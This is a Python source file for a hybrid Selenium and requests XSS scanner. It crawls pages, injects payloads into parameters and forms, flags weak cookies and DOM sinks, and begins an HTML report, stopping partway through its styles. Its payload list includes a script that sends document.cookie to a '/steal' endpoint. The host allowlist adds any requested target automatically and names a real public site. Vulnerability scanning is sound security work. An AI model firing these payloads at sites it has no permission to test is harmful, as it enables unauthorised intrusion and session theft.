"""
XSS scanning logic using a hybrid Selenium and requests approach.
Selenium for browser-based testing, requests for efficient crawling and scanning.
"""
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import TimeoutException, NoAlertPresentException, UnexpectedAlertPresentException
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse, ParseResult
from bs4 import BeautifulSoup
import collections
import time
import re
import os
import requests
import traceback
import datetime
import logging
from http.cookies import SimpleCookie
import json

# --- Configuration ---
# Set up logging
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'logs.txt')
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Log function for Selenium errors
def log_error(message, error=None, url=None):
    """Log errors to the log file with details"""
    error_msg = f"{message}"
    if url:
        error_msg += f" URL: {url}"
    if error:
        error_msg += f" | Error: {str(error)}"
        error_msg += f" | Trace: {traceback.format_exc()}"
    logging.error(error_msg)
    print(f"Error logged to {LOG_FILE}")

# XSS Test payloads
TEST_PAYLOADS = [
    "<penny_test_1>",
    "\"><img src=x onerror=console.log(1)>",
    "<script>console.log('penny')</script>",
    "<script>document.location='http://127.0.0.1:8000/steal?cookie='+document.cookie</script>",
    "<script>document.write('document.cookie='+document.cookie)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
]
    
# Allowed hosts for scanning - automatically expanded when user requests a new target
ALLOWED_HOSTS = ["localhost", "127.0.0.1", "juice-shop.herokuapp.com", "kochimetro.org"] 

# Special handling for known SPA (Single Page Applications)
SPA_SITES = {
    "juice-shop.herokuapp.com": {
        "type": "angular",
        "wait_time": 3,  # Longer wait for Angular to load
        "hash_navigation": True,  # Uses hash-based routing (#/)
        "common_paths": [
            "#/search", "#/login", "#/register", "#/contact", 
            "#/about", "#/score-board", "#/basket"
        ]
    }
}

# Scanning limits
MAX_PAGES = 50      # stop crawling after this many pages (reduced to be reasonable)
MAX_DEPTH = 3        # max crawl link depth from seed
REQUEST_TIMEOUT = 15  # Timeout for remote sites (increased for slower sites)
WAIT_TIME = 2        # Time to wait for JavaScript-heavy sites to load
DOM_RISK_PATTERNS = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "location.hash", "location.search", "eval(", "setAttribute(", "insertAdjacentHTML"
]

# --- Helper functions ---
def is_allowed_target(url, auto_add=False):
    """
    Check if the URL is in the allowed hosts list.
    If auto_add is True, automatically add new hosts to the allowed list.
    """
    try:
        p = urlparse(url)
        hostname = p.hostname
        
        if hostname in ALLOWED_HOSTS:
            return True
        
        if auto_add and hostname:
            logging.info(f"Adding new host to allowed list: {hostname}")
            ALLOWED_HOSTS.append(hostname)
            return True
        
        return False
    except Exception as e:
        log_error(f"Error checking allowed target", error=e, url=url)
        return False

def same_origin(a, b):
    pa, pb = urlparse(a), urlparse(b)
    port_a = pa.port if pa.port is not None else (443 if pa.scheme == "https" else 80)
    port_b = pb.port if pb.port is not None else (443 if pb.scheme == "https" else 80)
    return (pa.hostname == pb.hostname) and (port_a == port_b)

def normalize_url(base, link):
    return urljoin(base, link.split('#')[0])

def inject_into_query(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    new_parsed = ParseResult(parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment)
    return urlunparse(new_parsed)

def find_reflection(resp_text, marker):
    return marker in resp_text

def start_browser():
    """
    Start a Chrome browser with configurations suitable for testing any website.
    Enhanced to handle JavaScript-heavy sites and modern web applications like juice-shop.
    """
    logging.info("Starting Chrome browser with Selenium")
    options = Options()
    # options.add_argument('--headless')  # Disabled as per user request
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    options.add_argument('--ignore-certificate-errors')
    options.add_argument('--ignore-ssl-errors')
    options.add_argument('--disable-web-security')
    options.add_argument('--disable-features=IsolateOrigins,site-per-process')
    
    # Set default page load strategy to normal for better compatibility
    options.page_load_strategy = 'normal'
    
    # Add capability to handle unexpected alerts
    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    
    # Add preferences to handle downloads and notifications
    prefs = {
        "profile.default_content_setting_values.notifications": 2,  # Block notifications
        "profile.default_content_settings.popups": 0,
        "download.prompt_for_download": False,
        "download.directory_upgrade": True,
    }
    options.add_experimental_option("prefs", prefs)
    
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        # Set reasonable timeouts for JS-heavy sites
        driver.set_page_load_timeout(30)
        driver.set_script_timeout(30)
        return driver
    except Exception as e:
        log_error("Failed to initialize Chrome browser", error=e)
        raise

def extract_dynamic_content(driver, is_spa=False, spa_type=None):
    """
    Extract dynamically loaded content from JavaScript-heavy sites.
    Enhanced to handle SPA frameworks like Angular (Juice Shop).
    This helps find elements that may not be in the initial HTML response.
    """
    try:
        # Get all links from the page (including those added by JavaScript)
        links = driver.execute_script("""
            return Array.from(document.querySelectorAll('a[href]')).map(a => a.href);
        """)
        
        # Get all form elements (including dynamically generated ones)
        forms = driver.execute_script("""
            return Array.from(document.querySelectorAll('form')).map(form => {
                return {
                    action: form.action || window.location.href,
                    method: form.method || 'get',
                    elements: Array.from(form.elements).filter(el => el.name).map(el => {
                        return {name: el.name, type: el.type, value: el.value};
                    })
                };
            });
        """)
        
        # Get all input fields that might be part of AJAX forms
        inputs = driver.execute_script("""
            return Array.from(document.querySelectorAll('input[name], textarea[name], select[name]'))
                .filter(el => !el.form)  // Only get inputs not in a form
                .map(el => {
                    return {name: el.name, type: el.type || 'text', value: el.value};
                });
        """)
        
        # Special handling for Angular apps like Juice Shop
        if is_spa and spa_type == 'angular':
            # Get Angular-specific routes and inputs
            angular_elements = driver.execute_script("""
                // Try to find Angular elements with ng-model directives
                const angularInputs = [];
                const elements = document.querySelectorAll('[ng-model], [formControlName], [name]');
                elements.forEach(el => {
                    if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT') {
                        const name = el.getAttribute('ng-model') || 
                                    el.getAttribute('formControlName') || 
                                    el.getAttribute('name');
                        if (name) {
                            angularInputs.push({
                                name: name,
                                type: el.type || 'text',
                                value: el.value
                            });
                        }
                    }
                });
                
                // Try to find Angular links/routes
                const angularLinks = [];
                const routeLinks = document.querySelectorAll('[ng-href], [routerLink]');
                routeLinks.forEach(el => {
                    const href = el.getAttribute('ng-href') || el.getAttribute('routerLink');
                    if (href) {
                        // Handle both string and array formats for routerLink
                        if (href.startsWith('[') && href.endsWith(']')) {
                            try {
                                const parts = JSON.parse(href);
                                angularLinks.push(parts.join('/'));
                            } catch(e) {
                                angularLinks.push(href);
                            }
                        } else {
                            angularLinks.push(href);
                        }
                    }
                });
                
                return {
                    inputs: angularInputs,
                    links: angularLinks
                };
            """)
            
            # Add Angular-specific inputs to our standalone inputs
            if 'inputs' in angular_elements:
                inputs.extend(angular_elements['inputs'])
                
            # Add Angular-specific links
            if 'links' in angular_elements:
                current_url = driver.current_url
                base_url = current_url.split('#')[0] if '#' in current_url else current_url
                for link in angular_elements['links']:
                    if link.startswith('/'):
                        links.append(base_url + link)
                    elif link.startswith('#'):
                        links.append(base_url + link)
                    else:
                        links.append(link)
        
        return {
            "links": links,
            "forms": forms,
            "standalone_inputs": inputs
        }
    except Exception as e:
        log_error("Failed to extract dynamic content", error=e)
        return {"links": [], "forms": [], "standalone_inputs": []}

# --- Scanning functions ---
def scan_cookie_security(response, url):
    findings = []
    parsed_url = urlparse(url)
    is_https = parsed_url.scheme == 'https'
    
    # Check Set-Cookie headers
    if hasattr(response.headers, 'getall'):
        set_cookies = response.headers.getall('Set-Cookie') if 'Set-Cookie' in response.headers else []
        if not set_cookies:
            set_cookies = response.headers.getall('set-cookie') if 'set-cookie' in response.headers else []
    else:
        set_cookies = response.headers.get_all('Set-Cookie') if 'Set-Cookie' in response.headers else []
        if not set_cookies:
            set_cookies = response.headers.get_all('set-cookie') if 'set-cookie' in response.headers else []
    
    for set_cookie in set_cookies:
        try:
            cookie = SimpleCookie(set_cookie)
            for key, morsel in cookie.items():
                # Check for security flags
                httponly = 'httponly' in morsel
                secure = 'secure' in morsel
                samesite = morsel.get('samesite', '').lower()
                
                # Check for sensitive cookie names
                sensitive_keywords = ['session', 'token', 'auth', 'id', 'user', 'login', 'secret', 'csrf']
                is_sensitive = any(keyword in key.lower() for keyword in sensitive_keywords)
                
                # Check for missing security flags
                if not httponly:
                    findings.append({
                        "type": "cookie-security",
                        "subtype": "missing-httponly",
                        "cookie_name": key,
                        "url": url,
                        "secure": secure,
                        "httponly": httponly,
                        "sensitive": is_sensitive
                    })
                
                if is_https and not secure:
                    findings.append({
                        "type": "cookie-security",
                        "subtype": "missing-secure",
                        "cookie_name": key,
                        "url": url,
                        "secure": secure,
                        "httponly": httponly,
                        "sensitive": is_sensitive
                    })
                
                if samesite not in ('strict', 'lax'):
                    findings.append({
                        "type": "cookie-security",
                        "subtype": "weak-samesite",
                        "cookie_name": key,
                        "url": url,
                        "samesite": samesite or 'none',
                        "httponly": httponly,
                        "sensitive": is_sensitive
                    })
                
                # Check for potential sensitive data exposure
                if is_sensitive and not httponly:
                    findings.append({
                        "type": "cookie-security",
                        "subtype": "sensitive-data-exposure",
                        "cookie_name": key,
                        "url": url,
                        "secure": secure,
                        "httponly": httponly,
                        "sensitive": is_sensitive
                    })
        except Exception as e:
            print(f"Error parsing Set-Cookie header: {e}")
    
    # Check for cookies in HTML (JavaScript-set cookies)
    html = response.text if hasattr(response, 'text') else response
    js_cookie_patterns = [
        r'document\.cookie\s*=\s*["\']([^"\']+)["\']',
        r'document\.cookie\s*=\s*([^;]+)',
        r'\.cookie\s*=\s*["\']([^"\']+)["\']'
    ]
    
    for pattern in js_cookie_patterns:
        matches = re.findall(pattern, html, re.IGNORECASE)
        for match in matches:
            findings.append({
                "type": "cookie-security",
                "subtype": "js-cookie-set",
                "url": url,
                "match": match[:50] + "..." if len(match) > 50 else match
            })
    
    return findings

def scan_reflected(url, session):
    findings = []
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        params_to_test = ['p', 'q', 'search', 'id', 'page']
        base = url.split('?',1)[0]
    else:
        base = url.split('?',1)[0]
        params_to_test = list(qs.keys())
    for param in params_to_test:
        for payload in TEST_PAYLOADS:
            test_url = inject_into_query(base + ("?" + parsed.query if parsed.query else ""), param, payload)
            try:
                r = session.get(test_url, timeout=REQUEST_TIMEOUT)
                if find_reflection(r.text, payload):
                    findings.append({"type":"reflected","url":test_url,"param":param,"payload":payload})
            except Exception as e:
                print(f"  request error (reflected test) for {test_url}: {e}")
    return findings

def parse_forms(html, base_url):
    """
    Enhanced form parser that detects both traditional and modern form elements.
    Now handles forms without explicit <form> tags, AJAX forms, and JavaScript forms.
    """
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    
    # Handle traditional forms
    for form in soup.find_all("form"):
        action = form.get("action")
        method = (form.get("method") or "get").lower()
        form_url = normalize_url(base_url, action) if action else base_url
        inputs = {}
        
        # Get all input fields, including hidden ones
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
                
            itype = (inp.get("type") or "").lower()
            if itype in ("checkbox", "radio"):
                value = inp.get("value", "on")
            elif inp.name == "textarea":
                value = inp.text or ""
            else:
                value = inp.get("value", "")
            inputs[name] = value
        
        forms.append({"url": form_url, "method": method, "fields": inputs})
    
    # Handle potential AJAX forms (div/span with input elements)
    ajax_containers = []
    
    # Look for common AJAX form containers
    for container_type in ["div", "span", "section"]:
        for container in soup.find_all(container_type, class_=lambda c: c and any(keyword in str(c).lower() for keyword in ["form", "login", "register", "search", "input"])):
            ajax_containers.append(container)
    
    # Process potential AJAX form containers
    for container in ajax_containers:
        inputs = {}
        for inp in container.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
                
            itype = (inp.get("type") or "").lower()
            if itype in ("checkbox", "radio"):
                value = inp.get("value", "on")
            elif inp.name == "textarea":
                value = inp.text or ""
            else:
                value = inp.get("value", "")
            inputs[name] = value
        
        # Only add if we found actual inputs
        if inputs:
            # Look for possible submission URL
            data_url = container.get("data-action") or container.get("data-url")
            action_url = data_url if data_url else base_url
            forms.append({
                "url": normalize_url(base_url, action_url),
                "method": "post",  # Assume POST for AJAX forms
                "fields": inputs,
                "is_ajax": True
            })
    
    logging.info(f"Parsed {len(forms)} forms from {base_url}")
    return forms

def scan_forms_requests(url, session, forms):
    findings = []
    for form in forms:
        target = form["url"]
        method = form["method"]
        fields = form["fields"]
        # For each field, submit payload in that field while keeping others simple
        for field in list(fields.keys()):
            for payload in TEST_PAYLOADS:
                data = {k: (payload if k == field else (fields[k] or "test")) for k in fields.keys()}
                try:
                    if method == "post":
                        r = session.post(target, data=data, timeout=REQUEST_TIMEOUT)
                    else:
                        r = session.get(target, params=data, timeout=REQUEST_TIMEOUT)
                    if payload in r.text:
                        findings.append({"type":"form-injection","target":target,"field":field,"payload":payload,"method":method})
                except Exception as e:
                    print(f"  form request error to {target}: {e}")
    return findings

def scan_forms_selenium(url, driver, forms, screenshot_dir, screenshot_count):
    findings = []
    logging.info(f"Testing {len(forms)} forms with Selenium on page: {url}")
    for form in forms:
        target = form["url"]
        method = form["method"]
        fields = form["fields"]
        logging.info(f"Testing form with target: {target}, method: {method}, fields: {list(fields.keys())}")
        
        for field in list(fields.keys()):
            for payload in TEST_PAYLOADS:
                try:
                    driver.get(url)
                    time.sleep(0.2)  # Reduced delay for faster scanning
                    
                    # Find and fill form fields
                    form_elements = driver.find_elements(By.TAG_NAME, "form")
                    if not form_elements:
                        continue
                    
                    for form_el in form_elements:
                        inputs = form_el.find_elements(By.TAG_NAME, "input")
                        found_field = False
                        
                        for inp in inputs:
                            name = inp.get_attribute("name")
                            if name == field:
                                inp.clear()
                                inp.send_keys(payload)
                                found_field = True
                            elif name and name in fields:
                                inp.clear()
                                inp.send_keys(fields[name] or "test")
                        
                            # Submit if we found and filled our target field
                            if found_field:
                                try:
                                    logging.info(f"Submitting form with payload: '{payload}' in field: '{field}'")
                                    form_el.submit()
                                    time.sleep(0.3)  # Reduced delay for faster scanning
                                    screenshot_path = os.path.join(screenshot_dir, f"form_{screenshot_count}.png")
                                    driver.save_screenshot(screenshot_path)
                                    logging.info(f"Saved screenshot to {screenshot_path}")
                                    screenshot_count += 1
                                    
                                    # Check for alert
                                    try:
                                        alert = driver.switch_to.alert
                                        alert_text = alert.text
                                        alert.accept()
                                        logging.info(f"Handled alert: '{alert_text}'")
                                        findings.append({"type":"form-injection-alert","target":target,"field":field,"payload":payload,"method":method,"alert":alert_text})
                                    except NoAlertPresentException:
                                        pass
                                    except UnexpectedAlertPresentException as e:
                                        # Handle unexpected alert
                                        try:
                                            alert = driver.switch_to.alert
                                            alert_text = alert.text
                                            alert.accept()
                                            logging.info(f"Handled unexpected alert: '{alert_text}'")
                                            findings.append({"type":"form-injection-alert","target":target,"field":field,"payload":payload,"method":method,"alert_text":alert_text})
                                        except Exception:
                                            log_error("Failed to handle unexpected alert", error=e, url=target)
                                    
                                    # Check for payload in page
                                    if payload in driver.page_source:
                                        findings.append({"type":"form-injection","target":target,"field":field,"payload":payload,"method":method})
                                        logging.info(f"Found payload reflection in page: '{payload}'")
                                except Exception as e:
                                    print(f"  Form submit error: {e}")
                                    log_error(f"Form submission error", error=e, url=target)
                except Exception as e:
                    print(f"  selenium form error for {target}, field {field}: {e}")
                    log_error(f"Form scanning error for field {field}", error=e, url=target)
    return findings, screenshot_count

def scan_dom_risks(html, base_url):
    findings = []
    soup = BeautifulSoup(html, "html.parser")
    # inline scripts
    for script in soup.find_all("script"):
        script_text = script.string or ""
        if script_text:
            for pat in DOM_RISK_PATTERNS:
                if pat in script_text:
                    findings.append({"type":"dom-risk-inline","url":base_url,"pattern":pat})
    # linked scripts - note: we won't fetch external scripts; just check src existence
    for script in soup.find_all("script", src=True):
        src = script['src']
        findings.append({"type":"dom-risk-src","url":normalize_url(base_url, src),"pattern":"external-script"})
    # heuristic: inline event handlers (onerror, onclick, etc.)
    for tag in soup.find_all(True):
        for attr in ("onerror","onclick","onload","onmouseover"):
            if tag.has_attr(attr):
                findings.append({"type":"dom-risk-attribute","url":base_url,"attribute":attr,"tag":tag.name})
    return findings

# --- Crawler ---
def crawl_and_scan(start_url):
    """
    Main entry point for the XSS scanner. 
    Enhanced to handle any website, not just local test servers.
    Special handling for Single Page Applications like Juice Shop.
    """
    import time as time_module
    start_time = time_module.time()
    
    # Log the start of scanning
    logging.info(f"Starting scan for URL: {start_url}")
    
    # Check if target is allowed, automatically add if it's a valid URL
    if not is_allowed_target(start_url, auto_add=True):
        error_msg = f"ERROR: Invalid URL format or could not parse hostname from {start_url}"
        print(error_msg)
        logging.error(error_msg)
        return []
        
    # Check if this is a known SPA site
    parsed_url = urlparse(start_url)
    hostname = parsed_url.netloc
    is_spa = hostname in SPA_SITES
    
    if is_spa:
        spa_config = SPA_SITES[hostname]
        logging.info(f"Detected SPA site: {hostname}, type: {spa_config['type']}")
        
        # Set appropriate wait time for this SPA
        site_wait_time = spa_config.get('wait_time', WAIT_TIME)
        logging.info(f"Using SPA-specific wait time: {site_wait_time}s")
    else:
        site_wait_time = WAIT_TIME
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Set up screenshot directory - use temp folder to avoid Windows path length limit
    import tempfile
    screenshot_dir = tempfile.gettempdir()  # Use system temp folder (shorter path)
    screenshot_count = 1
    
    # Initialize both requests session and Selenium
    session = requests.Session()
    session.verify = False  # Disable SSL verification
    
    # Set up request headers to look like a normal browser
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    })
    
    try:
        driver = start_browser()
        
        seen = set()
        queue = collections.deque()
        queue.append((start_url, 0))
        summary_findings = []
        
        # For SPA sites like Juice Shop, add common hash routes to the queue
        if is_spa and spa_config.get('hash_navigation') and spa_config.get('common_paths'):
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            for path in spa_config['common_paths']:
                hash_url = f"{base_url}/{path}"
                queue.append((hash_url, 1))
            logging.info(f"Added {len(spa_config['common_paths'])} SPA-specific paths to scan queue")
        
        while queue and len(seen) < MAX_PAGES:
            url, depth = queue.popleft()
            if url in seen:
                continue
            if depth > MAX_DEPTH:
                logging.info(f"Skipping {url} - exceeds max depth {MAX_DEPTH}")
                continue
            
            page_start_time = time_module.time()
            print(f"[crawl] {url} (depth {depth})")
            logging.info(f"Processing URL #{len(seen)+1}/{MAX_PAGES}: {url} (depth {depth}, queue size: {len(queue)})")
            
            # --- PHASE 1: Fast crawling with requests ---
            try:
                logging.info(f"Crawling URL with requests: {url}")
                r = session.get(url, timeout=REQUEST_TIMEOUT, verify=False)  # Skip SSL verification for testing
                content_type = r.headers.get("Content-Type","")
                logging.info(f"URL {url} returned status code: {r.status_code}, content-type: {content_type}")
                
                # Check cookie security
                cookie_findings = scan_cookie_security(r, url)
                summary_findings.extend(cookie_findings)
                
                if "text/html" not in content_type:
                    print(f"[skip] {url} (content-type: {content_type})")
                    seen.add(url)
                    continue
                
                html = r.text
                
                # DOM heuristics
                dom_find = scan_dom_risks(html, url)
                summary_findings.extend(dom_find)
                
                # Parse forms for later testing
                forms = parse_forms(html, url)
                
                # Test forms with requests (fast)
                forms_find = scan_forms_requests(url, session, forms)
                summary_findings.extend(forms_find)
                
                # Test reflected XSS
                ref_find = scan_reflected(url, session)
                summary_findings.extend(ref_find)
                
                # Extract links for crawling
                soup = BeautifulSoup(html, "html.parser")
                links_found = 0
                for link in soup.find_all("a", href=True):
                    nxt = normalize_url(url, link['href'])
                    if same_origin(start_url, nxt):
                        if nxt not in seen:
                            queue.append((nxt, depth+1))
                            links_found += 1
                if links_found > 0:
                    logging.info(f"Added {links_found} new links to queue from {url}")
                
                # Also follow form action targets
                forms_added = 0
                for form in forms:
                    if same_origin(start_url, form["url"]) and form["url"] not in seen:
                        queue.append((form["url"], depth+1))
                        forms_added += 1
                if forms_added > 0:
                    logging.info(f"Added {forms_added} form targets to queue from {url}")
                
            except Exception as e:
                print(f"Failed request for {url}: {e}")
                log_error("Failed in request phase", error=e, url=url)
            
            # --- PHASE 2: Selenium for browser-based checks ---
            try:
                logging.info(f"Loading URL with Selenium: {url}")
                # Visit page with Selenium
                driver.get(url)
                
                # Wait for JavaScript to load for modern web applications (reduced for speed)
                time.sleep(0.3)  # Optimized delay for faster scanning
                logging.info(f"Successfully loaded {url} in Selenium browser")
                
                # Take a screenshot
                screenshot_path = os.path.join(screenshot_dir, f"page_{screenshot_count}.png")
                driver.save_screenshot(screenshot_path)
                screenshot_count += 1
                
                # Check for alert popups (may happen with some XSS)
                try:
                    alert = driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    logging.info(f"Auto-detected alert on page load: '{alert_text}'")
                    summary_findings.append({"type":"auto-alert","url":url,"alert_text":alert_text})
                except NoAlertPresentException:
                    pass
                except UnexpectedAlertPresentException:
                    # Handle unexpected alert
                    try:
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        alert.accept()
                        logging.info(f"Handled unexpected alert on page load: '{alert_text}'")
                        summary_findings.append({"type":"auto-alert","url":url,"alert_text":alert_text})
                    except Exception as alert_error:
                        log_error("Failed handling unexpected alert", error=alert_error, url=url)
                        
                # Extract dynamically loaded content using JavaScript
                if is_spa:
                    dynamic_content = extract_dynamic_content(driver, is_spa=True, spa_type=spa_config['type'])
                    logging.info(f"Extracted content from SPA ({spa_config['type']}): {len(dynamic_content['links'])} links and {len(dynamic_content['forms'])} forms")
                else:
                    dynamic_content = extract_dynamic_content(driver)
                    logging.info(f"Extracted {len(dynamic_content['links'])} dynamic links and {len(dynamic_content['forms'])} dynamic forms")
                
                # Add dynamic links to the crawl queue
                dynamic_links_added = 0
                for link in dynamic_content['links']:
                    try:
                        nxt = normalize_url(url, link)
                        if same_origin(start_url, nxt) and nxt not in seen:
                            queue.append((nxt, depth+1))
                            dynamic_links_added += 1
                    except Exception as e:
                        log_error("Failed processing dynamic link", error=e, url=link)
                if dynamic_links_added > 0:
                    logging.info(f"Added {dynamic_links_added} dynamic links to queue from {url}")
                
                # Re-parse forms and test with Selenium for interactive behavior
                selenium_forms = parse_forms(driver.page_source, url)
                
                # Convert dynamic forms from JavaScript extraction
                if dynamic_content['forms']:
                    logging.info(f"Processing {len(dynamic_content['forms'])} JavaScript-detected forms")
                    for form in dynamic_content['forms']:
                        # Convert the JavaScript form structure to our format
                        fields = {}
                        for element in form.get('elements', []):
                            if 'name' in element and element['name']:
                                fields[element['name']] = element.get('value', '')
                        
                        if fields:  # Only add if we have input fields
                            selenium_forms.append({
                                "url": form.get('action', url),
                                "method": form.get('method', 'post'),
                                "fields": fields,
                                "is_dynamic": True
                            })
                
                # Handle standalone inputs (potential AJAX form fields)
                if dynamic_content['standalone_inputs']:
                    fields = {}
                    for input_field in dynamic_content['standalone_inputs']:
                        if 'name' in input_field and input_field['name']:
                            fields[input_field['name']] = input_field.get('value', '')
                    
                    if fields:  # Add as a potential form if we found inputs
                        selenium_forms.append({
                            "url": url,
                            "method": "post",  # Assume POST for unknown forms
                            "fields": fields,
                            "is_ajax": True
                        })
                        
                # Test all forms with Selenium
                selenium_findings, screenshot_count = scan_forms_selenium(url, driver, selenium_forms, screenshot_dir, screenshot_count)
                summary_findings.extend(selenium_findings)
                
                # Selenium-based payload injection in URL parameters
                parsed = urlparse(url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                if qs:
                    params_to_test = list(qs.keys())
                    logging.info(f"Testing URL parameters for XSS: {params_to_test}")
                    for param in params_to_test:
                        for payload in TEST_PAYLOADS:
                            test_url = inject_into_query(url, param, payload)
                            try:
                                logging.info(f"Testing parameter '{param}' with payload: '{payload}'")
                                driver.get(test_url)
                                time.sleep(0.2)  # Reduced delay for faster parameter testing
                                
                                # Take screenshot of the injected page
                                screenshot_path = os.path.join(screenshot_dir, f"xss_test_{screenshot_count}.png")
                                driver.save_screenshot(screenshot_path)
                                screenshot_count += 1
                                
                                # Check for alerts (JavaScript execution)
                                try:
                                    alert = driver.switch_to.alert
                                    alert_text = alert.text
                                    alert.accept()
                                    logging.info(f"Parameter injection triggered alert: '{alert_text}'")
                                    summary_findings.append({"type":"reflected-js-alert","url":test_url,"param":param,"payload":payload,"alert_text":alert_text})
                                except NoAlertPresentException:
                                    pass
                                except UnexpectedAlertPresentException:
                                    # Handle unexpected alert
                                    try:
                                        alert = driver.switch_to.alert
                                        alert_text = alert.text
                                        alert.accept()
                                        logging.info(f"Parameter injection triggered unexpected alert: '{alert_text}'")
                                        summary_findings.append({"type":"reflected-js-alert","url":test_url,"param":param,"payload":payload,"alert_text":alert_text})
                                    except Exception as e:
                                        log_error("Failed to handle unexpected alert during parameter testing", error=e, url=test_url)
                            except Exception as e:
                                print(f"  Selenium error for {test_url}: {e}")
                                log_error("Failed during URL parameter testing", error=e, url=test_url)
            
            except Exception as e:
                print(f"Failed Selenium for {url}: {e}")
                log_error("Failed in Selenium phase", error=e, url=url)
            
            # Mark as seen to avoid revisiting
            seen.add(url)
            page_elapsed = time_module.time() - page_start_time
            logging.info(f"Completed scanning {url} in {page_elapsed:.1f}s, {len(summary_findings)} findings so far")
            # Removed delay for faster scanning
    
    except Exception as e:
        print(f"General error: {e}")
        log_error("Critical scanner error", error=e)
    
    finally:
        # Clean up
        try:
            driver.quit()
        except Exception as cleanup_error:
            log_error("Failed to clean up driver", error=cleanup_error)
        
        elapsed = time_module.time() - start_time
        # Log scan completion with detailed statistics
        logging.info(f"Scan completed. Processed {len(seen)} URLs in {elapsed:.1f}s with {len(summary_findings)} findings.")
        if seen:
            logging.info(f"URLs crawled: {', '.join(sorted(list(seen))[:10])}")
    
    return summary_findings

def categorize_findings(summary_findings):
    categorized = {
        "Reflected XSS candidates": [],
        "Stored XSS candidates (form POST)": [],
        "Form-based reflected (GET) candidates": [],
        "DOM-based risks": [],
        "Cookie Security Issues": [],
        "JavaScript Execution (Alert)": [],
        "Other/Misc": []
    }
    
    for f in summary_findings:
        typ = f.get("type")
        if typ == "reflected" or typ == "reflected-html":
            categorized["Reflected XSS candidates"].append(f)
        elif typ == "form-injection":
            method = f.get("method", "").lower()
            if method == "post":
                categorized["Stored XSS candidates (form POST)"].append(f)
            else:
                categorized["Form-based reflected (GET) candidates"].append(f)
        elif typ == "reflected-js-alert" or typ == "form-injection-alert" or typ == "auto-alert":
            categorized["JavaScript Execution (Alert)"].append(f)
        elif typ and typ.startswith("dom-risk"):
            categorized["DOM-based risks"].append(f)
        elif typ == "cookie-security":
            categorized["Cookie Security Issues"].append(f)
        else:
            categorized["Other/Misc"].append(f)
            
    return categorized

def generate_html_report(categorized, filename="xss_report.html"):
    """
    Generate an HTML report of the findings instead of a PDF.
    """
    # Log report generation
    logging.info(f"Generating HTML report: {filename}")
    
    # Group findings by URL for more organized reporting
    url_based_findings = {}
    all_findings = []
    
    # Collect all findings in a flat list
    for cat, items in categorized.items():
        for item in items:
            all_findings.append({"category": cat, **item})
    
    # Group by URL
    for finding in all_findings:
        url = finding.get("url") or finding.get("target", "Unknown URL")
        if url not in url_based_findings:
            url_based_findings[url] = []
        url_based_findings[url].append(finding)
    
    # Define severity colors
    severity_colors = {
        "high": "#e74c3c",    # Red
        "medium": "#f39c12",  # Orange
        "low": "#3498db"      # Blue
    }
    
    # Start building the HTML
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PennyWise XSS Security Report</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }}
        .header {{
            background-color: #2980b9;
            color: white;
            padding: 20px;
            margin-bottom: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }}
        .header h1 {{
            margin: 0;
            font-size: 28px;
        }}
        .header p {{
            margin: 5px 0 0 0;
            font-style: italic;
        }}
        .summary {{
            background-color: #f9f9f9;
            padding: 20px;
            margin-bottom: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }}
        .category-chart {{
            margin: 20px 0;
            padding: 15px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }}
        .bar-chart {{
            margin-top: 15px;
        }}
        .bar-container {{
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }}
        .bar-label {{
            width: 250px;
            font-weight: bold;
        }}
        .bar {{
            height: 25px;
            border-radius: 3px;
            transition: width 0.5s ease-in-out;
        }}
        .url-section {{
            margin-bottom: 30px;
            border: 1px solid #ddd;
            border-radius: 5px;
            overflow: hidden;
        }}
        .url-header {{
            background-color: #34495e;
            color: white;
            padding: 10px 15px;
            font-weight: bold;
            word-break: break-all;
        }}
        .url-content {{
            padding: 15px;
        }}
        .severity {{
            margin-bottom: 15px;
            border-radius: 3px;
            overflow: hidden;
        }}
        .severity-header {{
